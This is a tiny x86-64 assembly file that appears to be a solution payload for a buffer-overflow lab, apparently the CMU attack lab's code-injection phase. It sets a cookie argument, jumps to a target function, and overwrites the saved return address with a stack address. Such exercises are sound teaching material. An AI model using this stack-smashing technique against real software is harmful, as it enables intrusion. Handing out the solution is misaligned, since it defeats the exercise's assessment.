bits 64

section buf start=0h align=1h
    mov edi, 59B997FAh
    push qword 4017ECh
    ret
    ; db ' ' dup (ret_addr - $ - 4)
    db ' '

section ret_addr start=28h
ret_addr:
    dq 5561DC78h